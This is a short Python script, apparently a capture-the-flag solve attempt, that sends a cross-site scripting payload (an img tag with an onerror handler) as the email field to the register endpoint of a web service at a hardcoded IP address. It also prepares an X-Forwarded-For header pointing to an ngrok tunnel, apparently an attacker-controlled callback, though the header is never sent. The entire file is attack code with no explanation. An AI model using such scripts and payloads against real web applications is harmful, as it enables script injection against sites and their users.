#!/usr/bin/python3

from re import findall

from requests import get, post

url = "http://94.237.59.206:58786/"

data = {
    "email": "<img src=0 onerror=alert(0) />"
}

headers = {"X-Forwarded-For": "https://e9df-31-94-62-241.ngrok-free.app"}

r = post(url + "api/register", json=data)

print(r.text)
